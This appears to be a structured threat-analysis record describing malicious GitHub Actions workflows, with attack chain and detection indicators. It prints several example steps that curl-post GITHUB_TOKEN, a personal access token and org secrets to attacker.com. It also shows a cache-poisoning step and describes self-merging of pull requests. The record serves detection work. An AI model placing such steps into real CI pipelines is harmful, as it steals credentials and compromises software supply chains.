package_info.package_versions: N/A (applies to workflow definitions, not versioned packages)
package_info.why_malicious: The workflow definitions are manipulated to execute attacker-controlled code, exfiltrate secrets, abuse privileged tokens, and compromise build artifacts or infrastructure. These behaviors violate the expected security boundaries of CI/CD pipelines and can lead to supply chain compromise.

execution_context.trigger: ci-cd (pull_request_target event or direct push to protected branch)

malicious_snippets.code_snippet:
steps:
  - name: Exfiltrate secrets
    run: |
      curl -X POST -d "token=$GITHUB_TOKEN" https://attacker.com/exfil
malicious_snippets.code_behavior: During CI/CD workflow execution, the code accesses the GITHUB_TOKEN secret and sends its value to an external attacker-controlled domain via HTTP POST, enabling credential exfiltration.

malice_analysis.why_suspicious: Exfiltrating secrets to an external domain is a clear sign of malicious intent.
malice_analysis.violated_expectations: Normal workflows should never send secrets or tokens to untrusted external endpoints.
malice_analysis.similar_legitimate_use: Sending build status notifications to trusted internal endpoints (e.g., Slack, internal dashboards).
key_indicators: Use of curl or similar tools to send secrets externally
Access to GITHUB_TOKEN or other sensitive environment variables

malicious_snippets.code_snippet:
steps:
  - name: Poison build cache
    run: |
      echo 'malicious code' > ~/.cache/build-cache-entry
malicious_snippets.code_behavior: During CI/CD workflow execution, the code writes malicious data to the build cache directory, potentially poisoning the cache for future builds and compromising subsequent artifacts.

malice_analysis.why_suspicious: Modifying build cache with untrusted or malicious data can lead to persistent compromise across builds.
malice_analysis.violated_expectations: Build cache should only be written by trusted, reviewed code and not contain executable or attacker-controlled payloads.
malice_analysis.similar_legitimate_use: Legitimate workflows may cache dependencies or build artifacts, but not arbitrary code.
key_indicators: Writing unexpected files to cache locations

malicious_snippets.code_snippet:
steps:
  - name: Exfiltrate Personal Access Token
    run: |
      curl -X POST -d "pat=$PERSONAL_ACCESS_TOKEN" https://attacker.com/exfil
malicious_snippets.code_behavior: During CI/CD workflow execution, the code accesses a Personal Access Token (PAT) stored as a secret and exfiltrates it to an attacker-controlled domain.

malice_analysis.why_suspicious: Exfiltrating a PAT allows attackers to impersonate users and access all their repositories.
malice_analysis.violated_expectations: PATs should never be sent to untrusted endpoints or exposed in logs.
malice_analysis.similar_legitimate_use: Legitimate use would be using PATs to access GitHub APIs for automation, but not exfiltration.
key_indicators: Access to secrets with _PAT in the name

malicious_snippets.code_behavior: During CI/CD workflow execution, the code uses the GitHub CLI and GITHUB_TOKEN to programmatically approve and merge its own pull request, bypassing branch protection.

malice_analysis.why_suspicious: Automated self-approval and merging of PRs by workflows can bypass required reviews and allow malicious code into protected branches.
malice_analysis.violated_expectations: Branch protection rules are expected to require human review and approval.
malice_analysis.similar_legitimate_use: Automated merging after successful tests, but only with proper review and controls.
key_indicators: Use of gh pr review/merge in workflows
Automated approval/merge actions without human intervention

malicious_snippets.code_snippet:
steps:
  - name: Exfiltrate org-level secrets
    run: |
      curl -X POST -d "secret=$ORG_SECRET" https://attacker.com/exfil
malicious_snippets.code_behavior: During CI/CD workflow execution, the code accesses organization-level secrets and exfiltrates them to an attacker-controlled domain.

malice_analysis.why_suspicious: Organization-level secrets can grant access to critical infrastructure; exfiltrating them is highly malicious.
malice_analysis.violated_expectations: Org-level secrets should only be used for legitimate internal automation, not sent externally.
malice_analysis.similar_legitimate_use: None; org-level secrets should never be exfiltrated.
key_indicators: Access to secrets with org/global scope

attack_chain.action: Attacker gains access to modify workflow files (via PR, direct push, or new repo creation).
Malicious workflow executes in CI/CD environment with access to secrets and tokens.
attack_chain.leads_to: Secrets and tokens are exfiltrated to attacker.

attack_chain.action: Malicious workflow poisons build cache to persist compromise.
Workflow uses privileged tokens to self-approve and merge malicious code.
attack_chain.leads_to: Malicious code is merged into protected branches, escalating privileges.

attack_chain.action: Attacker uses exfiltrated secrets or tokens to pivot to other resources or compromise additional infrastructure.
attack_chain.leads_to: Full supply chain compromise or lateral movement.

behavioral_signatures: Workflow steps that access secrets and send them to external domains
Use of curl, wget, or similar tools in workflow steps with secret data
Automated approval or merging of pull requests via GitHub CLI or API
Direct manipulation of build cache directories from untrusted code
file_indicators: .github/workflows/*.yml containing suspicious run: curl/wget with secrets
Workflow files that access secrets with _PAT or ORG_SECRET in the name
Cache directories (e.g., ~/.cache) written to by untrusted workflow steps
network_indicators: Outbound HTTP/HTTPS requests to non-whitelisted or attacker-controlled domains from CI runners
POST requests containing secret or token values
detection_knowledge.how_to_detect: Monitor workflow definitions for steps that access secrets and perform network requests to untrusted domains. Flag use of curl/wget or GitHub CLI commands that automate PR approval/merge. Audit build cache usage for unexpected writes. Alert on any workflow that exfiltrates environment variables or secrets. Restrict workflow permissions and review all changes to CI/CD pipeline files.
